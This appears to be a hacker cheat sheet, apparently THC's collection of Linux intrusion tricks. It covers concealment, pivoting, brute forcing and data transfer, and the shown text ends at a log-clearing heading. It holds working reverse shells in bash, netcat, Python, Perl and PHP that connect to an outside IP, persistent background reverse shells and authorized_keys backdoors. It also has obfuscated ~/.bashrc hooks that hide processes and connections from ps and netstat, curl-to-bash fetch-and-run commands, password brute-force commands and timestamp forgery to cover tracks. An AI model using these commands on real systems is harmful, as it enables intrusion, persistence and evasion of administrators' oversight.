<!-- Use `grip 8080` to render the markdown locally -->
# THC's favourite Tips, Tricks & Hacks (Cheat Sheet)

A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.

We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.

Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)

1. [Bash](#bash)
   1. [Leave Bash without history](#bash-no-history)
   1. [Hide your commands](#bash-hide-command)
   1. [Hide your arguments](#bash-hide-arguments)
   1. [Hide a network connection](#bash-hide-connection)
   1. [Hide a process as user](#hide-a-process-user)
   1. [Hide a process as root](#hide-a-process-root)
   1. [Hide scripts](#hide-scripts)
1. [SSH](#ssh)
   1. [Almost invisible SSH](#ssh-invisible)
   1. [SSH tunnel](#ssh-tunnel)
   1. [SSH socks5 tunnel](#ssh-socks-tunnel)
   1. [SSH to NATed host](#ssh-j) 
   1. [SSH pivot via ProxyJump](#ssh-pj)
1. [Network](#network)
   1. [Discover hosts](#discover)
   1. [Tcpdump](#tcpdump)
   1. [Tunnel and forwarding](#tunnel)
   1. [Use any tool via Socks Proxy](#scan-proxy)
   1. [Find your public IP address](#your-ip)
   1. [Check reachability from around the world](#check-reachable)
   1. [Check Open Ports](#check-open-ports)
   1. [Brute Force Password Cracking](#bruteforce)
1. [Data Upload/Download/Exfil](#exfil)
   1. [File Encoding/Decoding](#file-encoding)
   1. [File transfer using screen](#file-transfer-screen)
   1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
   1. [File transfer using HTTP](#http)
1. [Reverse Shell / Dumb Shell](#reverse-shell)
   1. [Reverse Shells](#reverse-shell)
      1. [with gs-netcat](#reverse-shell-gs-netcat)
      1. [with Bash](#reverse-shell-bash)
      1. [without Bash](#reverse-shell-no-bash)
      1. [with Python](#reverse-shell-python)
      1. [with Perl](#reverse-shell-perl)
      1. [with PHP](#reverse-shell-php)
   1. [Upgrading the dumb shell](#reverse-shell-upgrade)
      1. [Upgrade a reverse shell to a pty shell](#reverse-shell-pty)
      1. [Upgrade a reverse shell to a fully interactive shell](#reverse-shell-interactive)
      1. [Reverse shell with socat (fully interactive)](#reverse-shell-socat)
1. [Backdoors](#backdoor)
   1. [Background reverse shell](#backdoor-background-reverse-shell)
   1. [authorized_keys](#backdoor-auth-keys)
   1. [Remote access an entire network](#backdoor-network)
1. [Shell Hacks](#shell-hacks)
   1. [Shred files (secure delete)](#shred)
   1. [Restore the date of a file](#restore-timestamp)
   1. [Clean logfile](#shell-clean-logs)
   1. [Hide files from a User without root privileges](#shell-hide-files)
   1. [Find out Linux Distro](#linux-info)
1. [Crypto](#crypto)
   1. [Generate quick random Password](#gen-password)
   1. [Linux transportable encrypted filesystems](#crypto-filesystem)
      1. [cryptsetup](#crypto-filesystem)
      1. [EncFS](#encfs)
   1. [Encrypting a file](#encrypting-file)
1. [Sniffing a user's SSH session](#ssh-sniffing)
   1. [with strace](#ssh-sniffing-strace)
   1. [with script](#ssh-sniffing-script)
   1. [with a wrapper script](#ssh-sniffing-wrapper)
   1. [with SSH-IT](#ssh-sniffing-sshit)
1. [VPN and Shells](#vpn-shell)
   1. [Disposable Root Servers](#shell)
   1. [VPN/VPS Providers](#vpn)
1. [OSINT Intelligence Gathering](#osint)
1. [Miscellaneous](#misc)
   1. [Tools of the trade](#tools)
   1. [Cool Linux commands](#cool-linux-commands)
   1. [tmux](#tmux)
   1. [Useful commands](#useful-commands)
1. [Other Sites](#others)
    
   

---
<a id="bash"></a>
## 1. Bash / Shell
<a id="bash-no-history"></a>
**1.i. Leave Bash without history:**

Tell Bash to use */dev/null* instead of *~/.bash_history*. This is the first command we execute on every shell. It will stop the Bash from logging your commands. 

```sh
export HISTFILE=/dev/null
unset SSH_CONNECTION
unset SSH_CLIENT
```

(We also clear SSH_* variables in case we logged in with SSH. Otherwise any process we start gets a copy of our IP in /proc/self/environ.)

It is good housekeeping to 'commit suicide' when exiting a shell:
```sh
alias exit='kill -9 $$'
```

Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
```
$  id
```

<a id="bash-hide-command"></a>
**1.ii. Hide your command**

```shell
(exec -a syslogd nmap -T0 10.0.2.1/24) # Note the brackets '(' and ')'
```

Starting a background hidden process:
```
exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &
```

Alternatively if there is no Bash:
```sh
cp `which nmap` syslogd
PATH=.:$PATH syslogd -T0 10.0.2.1/24
```
In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.

<a id="bash-hide-arguments"></a>
**1.iii. Hide your arguments**

Download [zap-args.c](src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.

```sh
gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24
```
Note: There is a gdb variant as well. Anyone?

<a id="bash-hide-connection"></a>
**1.iv. Hide a Network Connection**

The trick is to hijack `netstat` and use grep to filter out our connection. This example filters any connection on port 31337 _or_ ip 1.2.3.4. The same should be done for `ss` (a netstat alternative).

**Method 1 - Hiding a connection with bash-function in ~/.bashrc**

Cut & paste this to add the line to ~/.bashrc
```shell
echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

Or cut & paste this for an obfuscated entry to ~/.bashrc:
```shell
X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

The obfuscated entry to ~/.bashrc will look like this:
```
eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
```

**Method 2 - Hiding a connection with a binary in $PATH**

Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.

```shell
echo -e "#! /bin/bash
exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/netstat \
&& chmod 755 /usr/local/sbin/netstat \
&& touch -r /usr/bin/netstat /usr/local/sbin/netstat
```

*(thank you iamaskid)*

<a id="hide-a-process-user"></a>
**1.v. Hide a process as user**

Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the process list by renaming it to GREP:

```shell
echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

<a id="hide-a-process-root"></a>
**1.vi. Hide a process as root**

This requires root privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
```sh
hide()
{
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

To hide a command use:
```sh
hide                                 # Hides the current shell/PID
hide 31337                           # Hides process with pid 31337
hide sleep 1234                      # Hides 'sleep 1234'
hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a background process
```

(thanks to *druichi* for improving this)

<a id="hide-scripts"></a>
**1.vii. Hide shell scripts**

Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use `source` instead. The source command can be shortened to `.` (yes, a dot) _and_ it also searches through the $PATH variable to find the file to load.

In this example our script ```prng``` contains all of our shell functions from above. Those functions hide the `nmap` process and the network connection. Last we add `. prng` into the systemwide rc file. This will load `prng` when the user (and root) logs in:

```shell
echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prng \
&& echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
&& touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
```

(The same works for `lsof`, `ss` and `ls`)

---
<a id="ssh"></a>
## 2. SSH
<a id="ssh-invisible"></a>
**2.i. Almost invisible SSH**
```sh
ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```
This will not add your user to the */var/log/utmp* file and you won't show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.

<a id="ssh-tunnel"></a>
**2.ii SSH tunnel**

We use this all the time to circumvent local firewalls and IP filtering:
```sh
ssh -g -L31337:1.2.3.4:80 user@server.org
```
You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

Clever hackers use the keyboard combination `~C` to dynamically create these tunnels without having to reconnect the SSH. (thanks MessedeDegod).

We use this to give access to a friend to an internal machine that is not on the public Internet:
```sh
ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
```
Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

<a id="ssh-socks-tunnel"></a>
**2.iii SSH socks4/5 tunnel**

OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.

```sh
ssh -D 1080 user@server.org
```
Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *server.org* and will appear with the source IP of *server.org*. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

This is the reverse of the above example. It give others access to your *local* network or let others use your computer as a tunnel end-point.

```sh
ssh -g -R 1080 user@server.org
```

The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

<a id="ssh-j"></a>
**2.iv SSH to a host behind NAT**

[ssh-j.com](http://ssh-j.com) provides a great relay service: To access a host behind NAT/Firewall (via SSH).

On the host behind NAT: Create a reverse SSH tunnel to [ssh-j.com](http://ssh-j.com) like so:
```sh
## Cut & Paste on the host behind NAT.
ssh_j()
{
   local pw
   pw=$1
   [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
   echo "Press Ctrl-C to stop this tunnel."
   echo -e "To connect to this host: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
   ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
}

ssh_j                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected
ssh_j foobarblahblub                  # Creates tunnel with specific tunnel ID
ssh_j foobarblahblub 192.168.0.1 2222 # Tunnel to some other host on the LAN
```

Then use this command from anywhere else in the world to connect as 'root' to '5dmxf27tl4kx' (the host behind the NAT):
```sh
ssh -J 5dmxf27tl4kx@ssh-j.com root@5dmxf27tl4kx
```
The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind NAT. The traffic is end-2-end encrypted and ssh-j.com can not see the content.

<a id="ssh-pj"></a>
**2.v SSH pivoting to multiple servers**

SSH ProxyJump trick can save you a lot of time and hassle when working with remote servers. Let's assume the scenario as below.
We have $local-kali behind NAT, we want to ssh into $target-host without interactively login to each intermediary servers. 
The route is; we can SSH to C2, the C2 can SSH to internal-jumphost via internal IP(eth1) and internal-jumphost can SSH to target-host via eth2.
```sh
          $local-kali       -> $C2            -> $internal-jumphost    -> $target-host
eth0      192.168.8.160     10.25.237.119             
eth1                        192.168.5.130       192.168.5.135
eth2                                            172.16.2.120              172.16.2.121
```
```sh 
## if we want to SSH to $target-host:
kali@local-kali$ ssh -J c2@10.25.237.119:22,jumpuser@192.168.5.135:22 target@172.16.2.121

## if we want to SSH to $internal-jumphost:
kali@local-kali$ ssh -J c2@10.25.237.119:22 jumpuser@192.168.5.135:22
```

---
<a id="network"></a>
## 3. Network
<a id="discover"></a>
**3.i. Discover hosts**

```sh
## ARP disocer computers on the local network
nmap -r -sn -PR 192.168.0.1/24
```

```sh
## ICMP discover computers on the local netowrk
for x in `seq 1 254`; do ping -on -c 3 -i 0.1 -W 200 192.168.1.$x | grep 'bytes from' | cut -f4 -d" " | sort -u; done
```

<a id="tcpdump"></a>
**3.ii. tcpdump**

```sh
## Monitor every new TCP connection
tcpdump -n "tcp[tcpflags] == tcp-syn"

## Play a *bing*-noise for every new SSH connection
tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done

## Ascii output (for all large packets. Change to >40 if no TCP options are used).
tcpdump -s 2048 -nAq 'tcp and (ip[2:2] > 60)'
```

<a id="tunnel"></a>
**3.iii. Tunnel and forwarding**

```sh
## Connect to SSL (using socat)
socat stdio openssl-connect:smtp.gmail.com:465

## Connect to SSL (using openssl)
openssl s_client -connect smtp.gmail.com:465
```

```sh
## Bridge TCP to SSL
socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
```

More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvesec/port-forwarding).

<a id="scan-proxy"></a>
**3.iv. Use any tool via Socks Proxy**

On the target's network:
```sh
## Create a SOCKS proxy into the target's network.
## Use gs-netcat but ssh -D would work as well.
gs-netcat -l -S
```

On your workstation:
```sh
## Create a gsocket tunnel into the target's network:
gs-netcat -p 1080
```

```sh
## Use ProxyChain to access any host on the target's network: 
echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
proxychain -f pc.conf -q curl ipinfo.io
## Scan the router at 192.168.1.1
proxychain -f pc.conf -q nmap -n -Pn -sT -F --open --script=banner 192.168.1.1
## Start 10 nmaps in parallel:
seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sT -F --open --script=banner --script-timeout=5s 192.168.1.{} 
```

<a id="your-ip"></a>
**3.v. Find your public IP address**

```sh
curl ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com
host myip.opendns.com resolver1.opendns.com
```

Get geolocation information about any IP address:

```sh
curl https://ipinfo.io/8.8.8.8 | jq
curl http://ip-api.com/8.8.8.8
curl https://cli.fyi/8.8.8.8
```

Check if TOR is working:

```sh
curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s https://check.torproject.org/api/ip
```

<a id="check-reachable"></a>
**3.vi. Check reachability from around the world**

The fine people at [https://ping.pe/](https://ping.pe/) let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.

To check how well your (current) host can reach Internet use [OONI Probe](https://ooni.org/support/ooni-probe-cli):
```sh
ooniprobe run im
ooniprobe run websites
ooniprobe list
ooniprobe list 1
```

<a id="check-open-ports"></a>
**3.vii. Check Open Ports on an IP**

```shell
curl https://internetdb.shodan.io/1.1.1.1
```

<a id="bruteforce"></a>
**3.viii. Brute Force Password Cracking**

(This list is curated by Joey (?))

<a id="gmail"></a>
<details>
  <summary>GMail Imbeciles - CLICK HERE</summary>

> You can not brute force GMAIL accounts.  
> SMTP AUTH/LOGIN IS DISABLED ON GMAIL.  
> All GMail Brute Force and Password Cracking tools are FAKE.
</details>

All tools are pre-installed on segfault:
```shell
ssh root@segfaul.net # password is 'segfault'
```
(You may want to use your [own EXIT node](https://www.thc.org/segfault/wireguard))

Tools:
* [Ncrack](https://nmap.org/ncrack/man.html)
* [Nmap BRUTE](https://nmap.org/nsedoc/categories/brute.html)
* [THC Hydra](https://sectools.org/tool/hydra/)
* [Medusa](https://www.geeksforgeeks.org/password-cracking-with-medusa-in-linux/) / [docs](http://foofus.net/goons/jmk/medusa/medusa.html)
* [Metasploit](https://docs.rapid7.com/metasploit/bruteforce-attacks/)

Username & Password lists:
* `/usr/share/nmap/nselib/data`  
* `/usr/share/wordlists/seclists/Passwords`  
* https://github.com/danielmiessler/SecLists  
* https://weakpass.com  


Set **U**sername/**P**assword list and **T**arget host.
```shell
ULIST="/usr/share/wordlists/brutespray/mysql/user"
PLIST="/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"
T="192.168.0.1"
```

Useful **Nmap** parameters:
```shell
--script-args userdb="${ULIST}",passdb="${PLIST}",brute.firstOnly
```

Useful **Ncrack** parameters:
```shell
-U "${ULIST}"
-P "${PLIST}"
```

Useful **Hydra** parameters:
```shell
-t4      # Limit to 4 tasks
-l root  # Set username
-V       # Show each login/password attempt
-s 31337 # Set port
-S       # Use SSL
-f       # Exit after first valid login
```

<!--
```shell
## HTTP Login
hydra -l admin -P "${PLIST}" http-post-fomr "/admin.php:u=^USER&p-^PASS&f=login:'Enter'" -v
```
-->
```shell
## SSH
nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
ncrack -P "${PLIST}" --user root "ssh://${T}"
hydra -P "${PLIST}" -l root "ssh://$T"
```

```shell
## Remote Desktop Protocol / RDP
ncrack -P "${PLIST}" --user root -p3389 "${T}"
hydra -P "${PLIST}" -l root "rdp://$T"
```

```shell
## FTP
hydra -P "${PLIST}" -l user "ftp://$T"
```

```shell
## IMAP (email)
nmap -p 143,993 --script imap-brute "$T"
```

```shell
## POP3 (email)
nmap -p110,995 --script pop3-brute "$T"
```

```shell
## MySQL
nmap -p3306 --script mysql-brute "$T"
```

```shell
## PostgreSQL
nmap -p5432 --script pgsql-brute "$T"
```

```shell
## SMB (windows)
nmap --script smb-brute "$T"
```

```shell
## Telnet
nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"
```

```shell
## VNC
nmap -p5900 --script vnc-brute "$T"
ncrack -P "${PLIST}" --user root "vnc://$T"
hydra -P "${PLIST}" "vnc://$T"
medusa -P "${PLIST}" –u root –M vnc -h "$T"
```

```shell
## VNC (with metasploit)
msfconsole
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.0.1
set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
run
```

```shell
## HTML basic auth
echo admin >user.txt                     # Try only 1 username
echo -e "blah\naaddd\nfoobar" >pass.txt  # Add some passwords to try. 'aaddd' is the valid one.
nmap -p80 --script http-brute --script-args \
   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
   pentesteracademylab.appspot.com
```

---
<a id="exfil"></a>
## 4. Data Upload/Download/Exfil
<a id="file-encoding"></a>

### 4.i File Encoding

Encode binaries to text for transport via a terminal connection:

#### UU encode/decode

```sh
## uuencode 
uuencode /etc/issue.net issue.net-COPY
```
<details>
  <summary>Output - CLICK HERE</summary>

> begin 644 issue.net-COPY  
> 72V%L:2!'3E4O3&EN=7@@4F]L;&EN9PH\`  
> `  
> end
</details>

```sh
## uudecode (cut & paste the 3 lines from above):
uudecode
```

#### Openssl encode/decode

```sh
## openssl encode
openssl base64 </etc/issue.net
```
<details>
  <summary>Output - CLICK HERE</summary>

> VWJ1bnR1IDE4LjA0LjIgTFRTCg==
</details>

```sh
## openssl decode (cut & paste the 1 line from above):
openssl base64 -d >issue.net-COPY
```

#### xxd encode/decode

```sh
## xxd encode
xxd -p </etc/issue.net
```
<details>
  <summary>Output - CLICK HERE</summary>

> 4b616c6920474e552f4c696e757820526f6c6c696e670a
</details>

```sh
## xxd decode
xxd -p -r >issue.net-COPY
```

<a id="file-transfer-screen"></a>

### 4.ii. File transfer - using *screen*

#### From REMOTE to LOCAL (download)

Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output to screen-xfer.txt:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:

```sh
## On the remote system encode issue.net
openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H 

On your local computer decode the file:
```sh
openssl base64 -d <screen-xfer.txt
rm -rf screen-xfer.txt
```

#### From LOCAL to REMOTE (upload)

On your local system encode the data:
```sh
openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current *screen*):
```sh
openssl base64 -d
```

Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

<a id="file-transfer-gs-netcat"></a>

### 4.iii. File transfer - using gs-netcat and sftp

Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.

```sh
gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host behind NAT/Firewall
```

From your workstation execute this command to connect to the SFTP server:
```sh
export GSOCKET_ARGS="-s MySecret"                        # Workstation
sftp -D gs-netcat                                        # Workstation
```

<a id="http"></a>

### 4.iv. File transfer - using HTTP

```sh
## Spawn a temporary HTTP server and share the current working directory.
python -m http.server 8080
```


---
<a id="reverse-shell"></a>
## 5. Reverse Shell / Dumb Shell
<a id="reverse-shell-gs-netcat"></a>
**5.i.a. Reverse shell with gs-netcat**

Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>

```sh
gs-netcat -s MySecret -l -i    # Host
```
Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.

To connect to the shell from your workstation:
```sh
gs-netcat -s MySecret -i
```
Use -T to tunnel trough TOR.

<a id="reverse-shell-bash"></a>
**5.i.b. Reverse shell with Bash**

Start netcat to listen on port 1524 on your system:
```sh
nc -nvlp 1524
```

On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
```sh
setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1
# or hide the bash process as 'kqueue'
setsid bash -c 'exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1'
```

<a id="reverse-shell-no-bash"></a>
**5.i.c. Reverse shell without Bash**

Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:

On the remote system:

```sh
nc -e /bin/bash -vn 3.13.3.7 1524
```

Variant if *'-e'* is not supported:
```sh
mkfifo /tmp/.io
sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
```

Telnet variant:
```sh
mkfifo /tmp/.io
sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
```

Telnet variant when mkfifo is not supported (Ulg!):
```sh
(touch /dev/shm/.fio; sleep 60; rm -f /dev/shm/.fio) &
tail -f /dev/shm/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/dev/shm/.fio
```
Note: Use */tmp/.fio* if */dev/shm* is not available.
Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.

<a id="reverse-shell-python"></a>
**5.i.d. Reverse shell with Python**
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<a id="reverse-shell-perl"></a>
**5.i.e. Reverse shell with Perl**

```sh
# method 1
perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# method 2
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```
<a id="reverse-shell-php"></a>
**5.i.e. Reverse shell with PHP**

```sh
php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
```

<a id="reverse-shell-upgrade"></a>
<a id="reverse-shell-pty"></a>
**5.ii.a. Upgrade a reverse shell to a PTY shell**

Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrade the shell to a real PTY shell:

```sh
# Using script
exec script -qc /bin/bash /dev/null  # Linux
exec script -q /dev/null /bin/bash   # BSD
```

```sh
# Using python
exec python -c 'import pty; pty.spawn("/bin/bash")'
```

<a id="reverse-shell-interactive"></a>
**5.ii.b. Upgrade a reverse shell to a fully interactive shell**

...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:

```sh
# On the target host spwan a PTY using any of the above examples:
python -c 'import pty; pty.spawn("/bin/bash")'

# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
# On your terminal execute:
stty raw -echo opost; fg

# On target host
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 24 columns 80
PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]# ' # Pimp up your prompt
```

<a id="reverse-shell-socat"></a>
**5.ii.c. Reverse shell with socat (fully interactive)**

...or install socat and get it done without much fiddling about:

```sh
# on attacker's host (listener)
socat file:`tty`,raw,echo=0 tcp-listen:1524
# on target host (reverse shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
```

---
<a id="backdoor"></a>
## 6. Backdoors

Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
```sh
bash -c "$(curl -fsSLk gsocket.io/x)"
```
or
```sh
bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
```

<a id="backdoor-background-reverse-shell"></a>
**6.i. Background reverse shell**

A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 

```sh
setsid bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null
```

or the user's *~/.profile* (also stops multiple instances from being started):
```sh
fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 360; done' &>/dev/null &
```

<a id="backdoor-auth-keys"></a>
**6.ii. authorized_keys**

Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>

* It survives reboots.
* It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.
* We have even seen our key being copied to other companies!

Tip: Change the name at the end of the ssh public keyfile to something obscure like *backup@ubuntu* or the admin's real name:
```
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
[...]
u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
```
<a id="backdoor-network"></a>
**6.iii. Remote Access to an entire network**

Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS relay on the Host's private lan which is accessible through the Global Relay network without the need to run your own server (e.g. directly from your workstation):

```sh
gs-netcat -l -S       # compromised Host
```

Now from your workstation you can connect to ANY host on the Host's private LAN:
```sh
gs-netcat -p 1080    # Your workstation.

# Access route.local:22 on the Host's private LAN from your Workstation:
socat -  "SOCKS4a:127.1:route.local:22"
```

Use -T to use TOR.

---
<a id="shell-hacks"></a>
## 7. Shell Hacks
<a id="shred"></a>
**7.i. Shred & Erase a file**

```sh
shred -z foobar.txt
```

```sh
## SHRED without shred command
shred()
{
    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
    dd bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
    rm -f "${1:?}"
}
shred foobar.txt
```
Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.

Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.

<a id="restore-timestamp"></a>
**7.ii. Restore the date of a file**

Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)

```sh
touch -r /etc/shadow /etc/passwd
```

<a id="shell-clean-logs"></a>
**7.iii. Clear logfile**

